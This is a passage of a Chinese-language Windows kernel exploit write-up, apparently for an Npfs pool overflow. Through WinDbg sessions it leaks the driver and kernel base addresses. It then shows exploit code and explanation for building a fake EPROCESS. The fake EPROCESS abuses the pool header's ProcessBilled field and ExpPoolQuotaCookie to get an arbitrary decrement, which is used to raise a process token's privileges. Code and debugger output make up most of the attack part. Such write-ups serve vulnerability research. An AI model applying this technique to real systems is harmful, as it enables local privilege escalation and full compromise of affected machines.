    0: kd> dt _FILE_OBJECT 0xFFFFE103010A18F0
    ntdll!_FILE_OBJECT
       +0x000 Type             : 0n5
       +0x002 Size             : 0n216
       +0x008 DeviceObject     : 0xffffe102`faf538f0 _DEVICE_OBJECT
       +0x010 Vpb              : (null) 
       +0x018 FsContext        : 0xffffb800`09002980 Void
       +0x020 FsContext2       : 0xffffb800`0885a051 Void
       ..................................................
    0: kd> dt _DEVICE_OBJECT 0xffffe102`faf538f0
    ntdll!_DEVICE_OBJECT
       +0x000 Type             : 0n3
       +0x002 Size             : 0x308
       +0x004 ReferenceCount   : 0n2768
       +0x008 DriverObject     : 0xffffe102`facd8ce0 _DRIVER_OBJECT
       +0x010 NextDevice       : (null) 
       +0x018 AttachedDevice   : 0xffffe102`fc56ace0 _DEVICE_OBJECT
       ............................................................
    0: kd> dt _DRIVER_OBJECT 0xffffe102`facd8ce0
    ntdll!_DRIVER_OBJECT
       +0x000 Type             : 0n4
       +0x002 Size             : 0n336
       +0x008 DeviceObject     : 0xffffe102`faf538f0 _DEVICE_OBJECT
       +0x010 Flags            : 0x12
       +0x018 DriverStart      : 0xfffff803`3f090000 Void
       +0x020 DriverSize       : 0x1c000
       +0x028 DriverSection    : 0xffffe102`faa457c0 Void
       +0x030 DriverExtension  : 0xffffe102`facd8e30 _DRIVER_EXTENSION
       +0x038 DriverName       : _UNICODE_STRING "\FileSystem\Npfs"
       +0x048 HardwareDatabase : 0xfffff803`3a3af8f8 _UNICODE_STRING "\REGISTRY\MACHINE\HARDWARE\DESCRIPTION\SYSTEM"
       +0x050 FastIoDispatch   : 0xffffe102`fa77ae60 _FAST_IO_DISPATCH
       +0x058 DriverInit       : 0xfffff803`3f0a8010     long  Npfs!GsDriverEntry+0
       +0x060 DriverStartIo    : (null) 
       +0x068 DriverUnload     : (null) 
       +0x070 MajorFunction    : [28] 0xfffff803`3f09b670     long  Npfs!NpFsdCreate+0
    0: kd> ? 0xfffff803`3f09b670-0xB670
    Evaluate expression: -8782150565888 = fffff803`3f090000 //这就是Npfs的基址
    0: kd> lmDvmNpfs
    Browse full module list
    start             end                 module name
    fffff803`3f090000 fffff803`3f0ac000   Npfs       (pdb symbols)          d:\symbolsxp\npfs.pdb\D55EC1D15C78BD2E15ACB3E1D6A1A1111\npfs.pdb
        Loaded symbol image file: Npfs.SYS
        Image path: Npfs.SYS
        Image name: Npfs.SYS
        Browse all global symbols  functions  data
        Image was built with /Brepro flag.
        Timestamp:        B03ECFD3 (This is a reproducible build file hash, not a timestamp)
        CheckSum:         000252E2
        ImageSize:        0001C000
        Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4
        Information from resource tables:
    Unable to enumerate user-mode unloaded modules, Win32 error 0n30
    0: kd> ? fffff803`3f090000 + 0x7050
    Evaluate expression: -8782150537136 = fffff803`3f097050
    0: kd> ln fffff803`3f097050
    Browse module
    Set bu breakpoint
    (fffff803`3f097050)   Npfs!_imp_ExAllocatePoolWithTag   |  (fffff803`3f097058)   Npfs!_imp_ExFreePoolWithTag
    Exact matches:
    0: kd> dq fffff803`3f097050 L1
    fffff803`3f097050  fffff803`39d6f010
    0: kd> ln fffff803`39d6f010
    Browse module
    Set bu breakpoint
    (fffff803`39d6f010)   nt!ExAllocatePoolWithTag   |  (fffff803`39d6f0a0)   nt!ExFreePool
    Exact matches:
        nt!ExAllocatePoolWithTag (void)
    0: kd> ? fffff803`39d6f010 - 0x36f010
    Evaluate expression: -8782241333248 = fffff803`39a00000 //这就是kernel_base
    0: kd> lmDvmNT
    Browse full module list
    start             end                 module name
    fffff803`39a00000 fffff803`3a4b6000   nt         (pdb symbols)          d:\symbolsxp\ntkrnlmp.pdb\90F5E1C8BBE1FE1FB8A714305EE06F361\ntkrnlmp.pdb
        Loaded symbol image file: ntkrnlmp.exe
        Image path: ntkrnlmp.exe
        Image name: ntkrnlmp.exe
        Browse all global symbols  functions  data
        Image was built with /Brepro flag.
        Timestamp:        4EFCF7A9 (This is a reproducible build file hash, not a timestamp)
        CheckSum:         009785ED
        ImageSize:        00AB6000
        Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4
        Information from resource tables:
    Unable to enumerate user-mode unloaded modules, Win32 error 0n30
## 8\. SETUP_FAKE_EPROCESS
首先我们看下POOL_HEADER的结构：
    struct POOL_HEADER
    {
        char PreviousSize;
        char PoolIndex;
        char BlockSize;
        char PoolType;
        int PoolTag;
        Ptr64 ProcessBilled ;
    };
在POOL_HEADER中，如果设置了PoolType中的PoolQuota位，那么将触发POOL
HEADER中ProcessBilled指针的使用，ProcessBilled字段存储经过如下所示的运算后的值。
    ProcessBilled = EPROCESS_PTR ^ ExpPoolQuotaCookie ^ CHUNK_ADDR
当块被释放时，内核将检查ProcessBilled字段编码的指针是否是一个有效的EPROCESS指针
    process_ptr = (struct _EPROCESS *)(chunk_addr ^ ExpPoolQuotaCookie ^ chunk_addr ->process_billed );
    if ( process_ptr )
    {
        if (process_ptr Header.Type & 0x7F) != 3 )
        KeBugCheckEx ([...])
        [...]
    }
如果是有效的指针，释放块后，内核将尝试返还与EPROCESS相关的用于引用的Quota
counter。如果此时EPROCESS是我们提供的FAKE_EPROCESS，它将使用FAKE_EPROCESS结构体来寻找要解引用的指针值。这将提供任意递减原语。递减的值是PoolHeader中的BlockSize。
我们的最终目的是为了提权，那么这里用到的提权方法是设置EPROCESS中TOKEN结构体的Privileges.Enable字段和Privileges.Present字段，默认情况下，低完整性级别的Token的Privileges.Present被设置为0x602880000，Privileges.Enable被设置为0x800000，这时具有的权限只有SeChangeNotifyPrivilege，如果想获取更多权限，例如将Privileges.Enable减1，它将变成
0x7fff，这将启用更多的权限，所以现在我们要做的就是递减TOKEN结构体的Privileges.Enable字段和Privileges.Present字段。
所以现在需要获取ExpPoolQuotaCookie、幽灵块的地址、EXP进程的EPROCESS、EXP进程的TOKEN，以便构造一个正确的FAKE_EPROCESS结构。
    exploit_arbitrary_read(&xploit, xploit.kernel_base + NT_POOLQUOTACOOKIE_OFFSET, (char *)&xploit.ExpPoolQuotaCookie, 0x8);
    printf("[+] ExpPoolQuotaCookie is : 0x%llx\n", xploit.ExpPoolQuotaCookie);
    if (!find_self_eprocess(&xploit))//获取EXP进程的ERPCESS地址
            goto leave;
    exploit_arbitrary_read(&xploit, xploit.self_eprocess + 0x360, (char *)&xploit.self_token, 0x8);
    xploit.self_token = xploit.self_token & (~0xF);
    setup_fake_eprocess(&xploit);
获取到的值如下
    0: kd> ? fffff803`39a00000 + 0x5748D0
    Evaluate expression: -8782235612976 = fffff803`39f748d0
    0: kd> ln fffff803`39f748d0
    Browse module
    Set bu breakpoint
    (fffff803`39f748d0)   nt!ExpPoolQuotaCookie   |  (fffff803`39f748d8)   nt!PspEnclaveDispatchReturn
    Exact matches:
    0: kd> ? fffff803`39a00000 + 0x5743A0
    Evaluate expression: -8782235614304 = fffff803`39f743a0
    0: kd> ln fffff803`39f743a0 //system进程的EPROCESS
    Browse module
    Set bu breakpoint
    (fffff803`39f743a0)   nt!PsInitialSystemProcess   |  (fffff803`39f743a8)   nt!PpmPlatformStates
    Exact matches:
    0: kd> dt nt!_EPROCESS 0xFFFFE102FFBBD0C0
       +0x000 Pcb              : _KPROCESS
       +0x2e0 ProcessLock      : _EX_PUSH_LOCK
       +0x2e8 UniqueProcessId  : 0x00000000`0000073c Void
       +0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0xffffe102`fa0c5370 - 0xffffe102`ffc09370 ]//通过遍历这个结构，就可以找到EXP进程的EPROCESS
       +0x300 RundownProtect   : _EX_RUNDOWN_REF
       +0x308 Flags2           : 0x200d000
     ........................................
       +0x360 Token            : _EX_FAST_REF 
     ........................................
       +0x410 QuotaBlock       : 0xffffe102`fd322d40 _EPROCESS_QUOTA_BLOCK //这就是将要被递减的Quota counter 偏移为0x410
     ........................................
       +0x450 ImageFileName    : [15]  "poc_exploit-re"
    0: kd> ? 0xFFFFE102FFBBD0C0+0x360
    Evaluate expression: -34071980026848 = ffffe102`ffbbd420
    0: kd> dq ffffe102`ffbbd420 L1
    ffffe102`ffbbd420  ffffb800`08ddb064
    0: kd> ? ffffb800`08ddb064 & 0xFFFFFFFFFFFFFFF0
    Evaluate expression: -79164688453536 = ffffb800`08ddb060 //这里才是真实的TOKEN值